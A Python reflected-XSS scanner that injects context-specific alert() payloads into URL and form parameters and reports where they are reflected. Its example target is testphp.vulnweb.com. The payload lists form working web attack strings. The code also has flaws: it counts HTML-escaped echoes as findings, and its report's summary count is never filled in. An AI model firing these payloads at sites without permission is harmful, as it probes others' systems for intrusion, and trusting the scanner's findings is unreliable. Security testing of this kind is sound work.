#!/usr/bin/env python3
"""
Reflected XSS Scanner
A Python tool for detecting reflected XSS vulnerabilities with context-aware payload generation.
"""

import requests
import urllib.parse
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass
from enum import Enum
import re
import html
import concurrent.futures
import time


class InjectionContext(Enum):
    """Supported injection contexts for XSS payloads"""
    HTML_TEXT = "html_text"
    HTML_ATTRIBUTE_VALUE = "html_attribute_value"
    HTML_ATTRIBUTE_NAME = "html_attribute_name"
    HTML_TAG_NAME = "html_tag_name"
    JAVASCRIPT = "javascript"
    SCRIPT_TAG = "script_tag"
    URL_PARAM = "url_param"


@dataclass
class ReflectionResult:
    """Stores information about detected reflections"""
    url: str
    parameter: str
    payload: str
    context: InjectionContext
    reflected_position: str
    method: str
    response_snippet: str


class PayloadGenerator:
    """
    Generates context-aware XSS payloads.
    
    The generator adapts payloads based on the injection context to maximize
    the chances of successful XSS execution. Different contexts require
    different escape and injection techniques.
    """
    
    def __init__(self):
        self.marker = "XSSTEST"
        
    def generate_payloads(self, context: InjectionContext) -> List[str]:
        """
        Generate payloads specific to the given injection context.
        
        Args:
            context: The injection context (tag name, attribute, etc.)
            
        Returns:
            List of payloads tailored for that context
        """
        if context == InjectionContext.HTML_TEXT:
            return self._html_text_payloads()
        elif context == InjectionContext.HTML_ATTRIBUTE_VALUE:
            return self._attribute_value_payloads()
        elif context == InjectionContext.HTML_ATTRIBUTE_NAME:
            return self._attribute_name_payloads()
        elif context == InjectionContext.HTML_TAG_NAME:
            return self._tag_name_payloads()
        elif context == InjectionContext.JAVASCRIPT:
            return self._javascript_payloads()
        elif context == InjectionContext.SCRIPT_TAG:
            return self._script_tag_payloads()
        else:
            return self._generic_payloads()
    
    def _html_text_payloads(self) -> List[str]:
        """Payloads for injection into HTML text content"""
        return [
            f"<script>alert('{self.marker}')</script>",
            f"<img src=x onerror=alert('{self.marker}')>",
            f"<svg onload=alert('{self.marker}')>",
            f"<body onload=alert('{self.marker}')>",
            f"<iframe src=javascript:alert('{self.marker}')>",
        ]
    
    def _attribute_value_payloads(self) -> List[str]:
        """Payloads for injection into HTML attribute values"""
        return [
            f"' onmouseover=alert('{self.marker}') '",
            f'" onload=alert("{self.marker}") "',
            f"' autofocus onfocus=alert('{self.marker}') '",
            f"'><script>alert('{self.marker}')</script><'",
            f'"/><img src=x onerror=alert("{self.marker}")>',
            f"javascript:alert('{self.marker}')",
        ]
    
    def _attribute_name_payloads(self) -> List[str]:
        """
        Payloads for injection into HTML attribute names.
        This is a critical context where the payload becomes the attribute itself.
        """
        return [
            f"onload=alert('{self.marker}')",
            f"onfocus=alert('{self.marker}') autofocus x",
            f"onmouseover=alert('{self.marker}') y",
            f"onerror=alert('{self.marker}') src=x",
            f"onclick=alert('{self.marker}') z",
            f"onanimationstart=alert('{self.marker}') style=animation-name:x",
        ]
    
    def _tag_name_payloads(self) -> List[str]:
        """Payloads for injection into HTML tag names"""
        return [
            f"script>alert('{self.marker}')</script><x",
            f"img src=x onerror=alert('{self.marker}')><x",
            f"svg onload=alert('{self.marker}')><x",
            f"iframe src=javascript:alert('{self.marker}')><x",
        ]
    
    def _javascript_payloads(self) -> List[str]:
        """Payloads for injection into JavaScript code"""
        return [
            f"';alert('{self.marker}');//",
            f'";alert("{self.marker}");//',
            f"-alert('{self.marker}')-",
            f"</script><script>alert('{self.marker}')</script><script>",
            f"'-alert('{self.marker}')-'",
        ]
    
    def _script_tag_payloads(self) -> List[str]:
        """Payloads for injection inside <script> tags"""
        return [
            f"</script><script>alert('{self.marker}')</script><script>",
            f"'-alert('{self.marker}')-'",
            f'"-alert("{self.marker}")-"',
            f";alert('{self.marker}');//",
        ]
    
    def _generic_payloads(self) -> List[str]:
        """Generic payloads that work in multiple contexts"""
        return [
            f"<script>alert('{self.marker}')</script>",
            f"<img src=x onerror=alert('{self.marker}')>",
            f"'><script>alert('{self.marker}')</script>",
            f'"><img src=x onerror=alert("{self.marker}")>',
        ]


class XSSScanner:
    """
    Main XSS scanner class that tests URLs for reflected XSS vulnerabilities.
    """
    
    def __init__(self, timeout: int = 10, user_agent: Optional[str] = None):
        self.timeout = timeout
        self.session = requests.Session()
        self.payload_generator = PayloadGenerator()
        self.results: List[ReflectionResult] = []
        
        if user_agent:
            self.session.headers['User-Agent'] = user_agent
        else:
            self.session.headers['User-Agent'] = 'XSS-Scanner/1.0'
    
    def scan_url(
        self,
        url: str,
        parameters: List[str],
        contexts: List[InjectionContext],
        method: str = 'GET',
        data: Optional[Dict] = None,
        headers: Optional[Dict] = None,
        cookies: Optional[Dict] = None
    ) -> List[ReflectionResult]:
        """
        Scan a URL for XSS vulnerabilities.
        
        Args:
            url: Target URL to scan
            parameters: List of parameter names to test
            contexts: List of injection contexts to test
            method: HTTP method (GET or POST)
            data: Additional POST data (for POST requests)
            headers: Custom headers
            cookies: Custom cookies
            
        Returns:
            List of detected reflections
        """
        results = []
        
        for param in parameters:
            for context in contexts:
                payloads = self.payload_generator.generate_payloads(context)
                
                for payload in payloads:
                    result = self._test_payload(
                        url, param, payload, context, method, data, headers, cookies
                    )
                    if result:
                        results.append(result)
                        print(f"[+] Reflection found: {param} in {context.value}")
        
        self.results.extend(results)
        return results
    
    def _test_payload(
        self,
        url: str,
        parameter: str,
        payload: str,
        context: InjectionContext,
        method: str,
        data: Optional[Dict],
        headers: Optional[Dict],
        cookies: Optional[Dict]
    ) -> Optional[ReflectionResult]:
        """Test a single payload against a parameter"""
        try:
            if method.upper() == 'GET':
                # Add payload to URL parameter
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                params[parameter] = [payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = urllib.parse.urlunparse(
                    (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
                )
                
                response = self.session.get(
                    test_url,
                    timeout=self.timeout,
                    headers=headers,
                    cookies=cookies,
                    allow_redirects=True
                )
            else:  # POST
                post_data = data.copy() if data else {}
                post_data[parameter] = payload
                
                response = self.session.post(
                    url,
                    data=post_data,
                    timeout=self.timeout,
                    headers=headers,
                    cookies=cookies,
                    allow_redirects=True
                )
            
            # Check for reflection
            if self._is_reflected(payload, response.text):
                snippet = self._extract_snippet(response.text, payload)
                return ReflectionResult(
                    url=url,
                    parameter=parameter,
                    payload=payload,
                    context=context,
                    reflected_position=snippet,
                    method=method,
                    response_snippet=snippet
                )
        
        except requests.exceptions.RequestException as e:
            print(f"[-] Request error for {parameter}: {e}")
        
        return None
    
    def _is_reflected(self, payload: str, response_text: str) -> bool:
        """Check if payload is reflected in the response"""
        # Simple substring matching
        if payload in response_text:
            return True
        
        # Check for HTML-encoded version
        encoded = html.escape(payload)
        if encoded in response_text:
            return True
        
        # Check for URL-encoded version
        url_encoded = urllib.parse.quote(payload)
        if url_encoded in response_text:
            return True
        
        return False
    
    def _extract_snippet(self, response_text: str, payload: str, context_size: int = 100) -> str:
        """Extract a snippet of text around the reflected payload"""
        index = response_text.find(payload)
        if index == -1:
            # Try encoded versions
            encoded = html.escape(payload)
            index = response_text.find(encoded)
            if index == -1:
                return "Reflection found but context unavailable"
        
        start = max(0, index - context_size)
        end = min(len(response_text), index + len(payload) + context_size)
        snippet = response_text[start:end]
        
        return f"...{snippet}..."
    
    def scan_parallel(
        self,
        url: str,
        parameters: List[str],
        contexts: List[InjectionContext],
        method: str = 'GET',
        max_workers: int = 5
    ) -> List[ReflectionResult]:
        """Scan multiple parameters in parallel"""
        results = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            
            for param in parameters:
                for context in contexts:
                    future = executor.submit(
                        self._scan_param_context,
                        url, param, context, method
                    )
                    futures.append(future)
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    results.extend(result)
        
        self.results.extend(results)
        return results
    
    def _scan_param_context(
        self,
        url: str,
        param: str,
        context: InjectionContext,
        method: str
    ) -> List[ReflectionResult]:
        """Helper method for parallel scanning"""
        results = []
        payloads = self.payload_generator.generate_payloads(context)
        
        for payload in payloads:
            result = self._test_payload(url, param, payload, context, method, None, None, None)
            if result:
                results.append(result)
                print(f"[+] Reflection found: {param} in {context.value}")
        
        return results
    
    def generate_report_terminal(self) -> str:
        """Generate a terminal-based report of findings"""
        if not self.results:
            return "\n[*] No reflections detected.\n"
        
        report = "\n" + "="*80 + "\n"
        report += "XSS SCANNER RESULTS\n"
        report += "="*80 + "\n\n"
        
        for i, result in enumerate(self.results, 1):
            report += f"Finding #{i}\n"
            report += "-" * 80 + "\n"
            report += f"URL:        {result.url}\n"
            report += f"Parameter:  {result.parameter}\n"
            report += f"Method:     {result.method}\n"
            report += f"Context:    {result.context.value}\n"
            report += f"Payload:    {result.payload}\n"
            report += f"Snippet:    {result.response_snippet[:200]}\n"
            report += "\n"
        
        report += "="*80 + "\n"
        report += f"Total reflections found: {len(self.results)}\n"
        report += "="*80 + "\n"
        
        return report
    
    def generate_report_html(self, output_file: str = "xss_report.html"):
        """Generate an HTML report of findings"""
        html_content = """
<!DOCTYPE html>
<html>
<head>
    <title>XSS Scanner Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1 { color: #d32f2f; border-bottom: 3px solid #d32f2f; padding-bottom: 10px; }
        .summary { background: #fff3cd; padding: 15px; border-left: 4px solid #ffc107; margin: 20px 0; }
        .finding { border: 1px solid #ddd; margin: 20px 0; padding: 15px; border-radius: 5px; }
        .finding-header { background: #f44336; color: white; padding: 10px; margin: -15px -15px 15px -15px; border-radius: 5px 5px 0 0; }
        .field { margin: 10px 0; }
        .label { font-weight: bold; color: #555; display: inline-block; width: 120px; }
        .value { font-family: monospace; background: #f5f5f5; padding: 5px; border-radius: 3px; }
        .snippet { background: #263238; color: #aed581; padding: 10px; border-radius: 5px; overflow-x: auto; margin-top: 10px; }
        .no-findings { color: #4caf50; font-size: 18px; text-align: center; padding: 40px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 XSS Scanner Report</h1>
        <div class="summary">
            <strong>Scan Summary:</strong> {total} reflection(s) detected
        </div>
"""
        
        if not self.results:
            html_content += '<div class="no-findings">✓ No reflections detected</div>'
        else:
            for i, result in enumerate(self.results, 1):
                html_content += f"""
        <div class="finding">
            <div class="finding-header">Finding #{i}</div>
            <div class="field"><span class="label">URL:</span> <span class="value">{html.escape(result.url)}</span></div>
            <div class="field"><span class="label">Parameter:</span> <span class="value">{html.escape(result.parameter)}</span></div>
            <div class="field"><span class="label">Method:</span> <span class="value">{result.method}</span></div>
            <div class="field"><span class="label">Context:</span> <span class="value">{result.context.value}</span></div>
            <div class="field"><span class="label">Payload:</span> <span class="value">{html.escape(result.payload)}</span></div>
            <div class="field">
                <span class="label">Response Snippet:</span>
                <div class="snippet">{html.escape(result.response_snippet[:500])}</div>
            </div>
        </div>
"""
        
        html_content += """
    </div>
</body>
</html>
""".format(total=len(self.results))
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"\n[+] HTML report saved to: {output_file}")


def main():
    """Example usage of the XSS scanner"""
    
    # Example 1: Simple scan
    print("="*80)
    print("XSS Scanner - Example Usage")
    print("="*80)
    
    scanner = XSSScanner()
    
    # Test URL (replace with actual target)
    target_url = "http://testphp.vulnweb.com/search.php?test=query"
    
    # Parameters to test
    params = ["test", "search", "q"]
    
    # Contexts to test
    contexts = [
        InjectionContext.HTML_TEXT,
        InjectionContext.HTML_ATTRIBUTE_VALUE,
        InjectionContext.HTML_ATTRIBUTE_NAME,
        InjectionContext.JAVASCRIPT,
    ]
    
    print(f"\n[*] Scanning: {target_url}")
    print(f"[*] Testing parameters: {', '.join(params)}")
    print(f"[*] Testing contexts: {len(contexts)} contexts\n")
    
    # Perform scan
    results = scanner.scan_url(
        url=target_url,
        parameters=params,
        contexts=contexts,
        method='GET'
    )
    
    # Generate reports
    print(scanner.generate_report_terminal())
    scanner.generate_report_html()
    
    print("\n[*] Scan complete!")


if __name__ == "__main__":
    main()
